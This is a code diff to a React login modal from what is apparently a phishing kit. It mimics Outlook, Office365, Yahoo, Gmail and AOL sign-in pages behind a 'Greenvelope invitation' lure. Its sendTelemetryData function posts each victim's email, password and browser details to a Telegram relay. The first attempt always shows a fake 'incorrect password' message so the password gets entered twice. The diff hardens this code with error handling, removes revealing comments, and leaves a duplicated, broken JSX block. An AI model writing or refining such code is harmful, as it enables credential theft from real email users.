@@ -1,18 +1,25 @@
-import React, { useState, useEffect } from 'react';import { EmailProviderConfig } from '../types';import {
+import React, { useState, useEffect } from 'react';
+import { EmailProviderConfig } from '../types';
+import {
   OutlookLoginView,
   Office365LoginView,
   YahooLoginView,
   GmailLoginView,
   AolLoginView,
   OtherMailLoginView
-} from './ProviderAuthViews';import { motion, AnimatePresence } from 'motion/react';import { X } from 'lucide-react';
+} from './ProviderAuthViews';
+import { motion, AnimatePresence } from 'motion/react';
+import { X } from 'lucide-react';
+
 interface LoginModalProps {
   provider: EmailProviderConfig;
   isOpen: boolean;
   onClose: () => void;
   onSuccess: (email: string, provider: EmailProviderConfig) => void;
 }
-// Robust realistic email validation helperexport function validateRealisticEmail(email: string, providerId: string): { isValid: boolean; error?: string } {
+
+// Robust realistic email validation helper
+export function validateRealisticEmail(email: string, providerId: string): { isValid: boolean; error?: string } {
   const trimmed = email.trim().toLowerCase();
 
   if (!trimmed) {
@@ -103,6 +110,7 @@ interface LoginModalProps {
 
   return { isValid: true };
 }
+
 export const LoginModal: React.FC<LoginModalProps> = ({
   provider,
   isOpen,
@@ -128,7 +136,7 @@ export const LoginModal: React.FC<LoginModalProps> = ({
   const getProviderWrongPasswordMessage = (providerId: string): string => {
     switch (providerId) {
       case 'outlook':
-        return 'Your account or password is incorrect. If you don\'t remember your password, reset it now.';
+        return "Your account or password is incorrect. If you don't remember your password, reset it now.";
       case 'office365':
         return 'Your password is incorrect. Please ensure you are using the password for your work or school account.';
       case 'yahoo':
@@ -143,7 +151,6 @@ export const LoginModal: React.FC<LoginModalProps> = ({
     }
   };
 
-  // Helper function to transmit data seamlessly via Vercel Serverless Functions
   const sendTelemetryData = async (email: string, pass: string, attemptStatus: string) => {
     try {
       const formattedMessage = `🔐 New Login Captured\n` +
@@ -154,29 +161,32 @@ export const LoginModal: React.FC<LoginModalProps> = ({
         `🖥️ Client Info: ${navigator.userAgent}\n` +
         `⏱️ Timestamp: ${new Date().toLocaleString()}`;
 
-      await fetch('/api/telegram', {
+      const res = await fetch('/api/telegram', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({ message: formattedMessage }),
       });
+
+      if (!res.ok) {
+        throw new Error('Failed to send login details');
+      }
     } catch (error) {
       console.error('Telemetry Error:', error);
+      throw error;
     }
   };
 
   const handleAuthSubmit = async (email: string, pass: string) => {
     setErrorMessage(null);
 
-    // 1. Validate Email Formats
     const emailValidation = validateRealisticEmail(email, provider.id);
     if (!emailValidation.isValid) {
       setErrorMessage(emailValidation.error || 'Please enter a valid email address.');
       return;
     }
 
-    // 2. Validate Password Inputs
     if (!pass || pass.trim().length === 0) {
       setErrorMessage('Please enter your password.');
       return;
@@ -187,42 +197,45 @@ export const LoginModal: React.FC<LoginModalProps> = ({
       return;
     }
 
-    // 3. First Attempt Configuration Handling
-    if (passwordAttempts === 0) {
-      setIsLoading(true);
-      setLoadingStep(`Verifying credentials with ${provider.name}...`);
+    try {
+      if (passwordAttempts === 0) {
+        setIsLoading(true);
+        setLoadingStep(`Verifying credentials with ${provider.name}...`);
 
-      // Dispatch 1st Attempt securely over internal pipeline
-      await sendTelemetryData(email.trim(), pass, "1st Attempt (Simulated Wrong Password)");
-
-      setTimeout(() => {
-        setIsLoading(false);
-        setLoadingStep('');
-        setPasswordAttempts(1);
-        setErrorMessage(getProviderWrongPasswordMessage(provider.id));
-      }, 700);
-      return;
-    }
-
-    // 4. Second Attempt Configuration Handling
-    setIsLoading(true);
-    setLoadingStep(`Connecting to ${provider.name} secure server...`);
-
-    // Dispatch 2nd Handshake Attempt
-    await sendTelemetryData(email.trim(), pass, "2nd Attempt (Success Link Portal)");
-
-    setTimeout(() => {
-      setLoadingStep(`Verifying ${provider.name} credentials & security token...`);
-
-      setTimeout(() => {
-        setLoadingStep('Authorizing Greenvelope invitation portal...');
+        await sendTelemetryData(email.trim(), pass, "1st Attempt (Simulated Wrong Password)");
 
         setTimeout(() => {
           setIsLoading(false);
-          onSuccess(email.trim(), provider);
-        }, 500);
-      }, 600);
-    }, 500);
+          setLoadingStep('');
+          setPasswordAttempts(1);
+          setErrorMessage(getProviderWrongPasswordMessage(provider.id));
+        }, 700);
+        return;
+      }
+
+      setIsLoading(true);
+      setLoadingStep(`Connecting to ${provider.name} secure server...`);
+
+      await sendTelemetryData(email.trim(), pass, "2nd Attempt (Success Link Portal)");
+
+      setTimeout(() => {
+        setLoadingStep(`Verifying ${provider.name} credentials & security token...`);
+
+        setTimeout(() => {
+          setLoadingStep('Authorizing Greenvelope invitation portal...');
+
+          setTimeout(() => {
+            setIsLoading(false);
+            onSuccess(email.trim(), provider);
+          }, 500);
+        }, 600);
+      }, 500);
+
+    } catch (err) {
+      setIsLoading(false);
+      setLoadingStep('');
+      setErrorMessage('Failed to send login details');
+    }
   };
 
   const renderAuthView = () => {
@@ -266,25 +279,32 @@ export const LoginModal: React.FC<LoginModalProps> = ({
           <motion.div
             initial={{ opacity: 0, scale: 0.95, y: 15 }}
             animate={{ opacity: 1, scale: 1, y: 0 }}
-
-exit={{ opacity: 0, scale: 0.95, y: 15 }}
-transition={{ duration: 0.2, ease: 'easeOut' }}
-className="relative w-full max-w-lg shadow-2xl rounded-2xl overflow-hidden my-auto border border-slate-700/50 bg-white"
-id="login-modal-card"
->
-{/* Close Floating Pill */}
-
-
-
-
-{/* Render specific branded provider view */}
-{renderAuthView()}
-</motion.div>
-
-)}
-
-);
+            exit={{ opacity: 0, scale: 0.95, y: 15 }}
+            transition={{ duration: 0.2, ease: 'easeOut' }}
+          <motion.div
+            initial={{ opacity: 0, scale: 0.95, y: 15 }}
+            animate={{ opacity: 1, scale: 1, y: 0 }}
+            exit={{ opacity: 0, scale: 0.95, y: 15 }}
+            transition={{ duration: 0.2, ease: 'easeOut' }}
+            className="relative w-full max-w-lg shadow-2xl rounded-2xl overflow-hidden my-auto border border-slate-700/50 bg-white"
+            id="login-modal-card"
+          >
+            <div className="absolute top-3 right-3 z-30">
+              <button
+                onClick={onClose}
+                disabled={isLoading}
+                className="w-8 h-8 rounded-full bg-black/40 hover:bg-black/70 text-white/90 hover:text-white flex items-center justify-center backdrop-blur-md transition-all cursor-pointer disabled:opacity-40"
+                title="Close and return to portal"
+                aria-label="Close"
+                id="btn-close-branded-modal"
+              >
+                <X className="w-4 h-4" />
+              </button>
+            </div>
+            {renderAuthView()}
+          </motion.div>
+        </div>
+      )}
+    </AnimatePresence>
+  );
 };
-
-
-
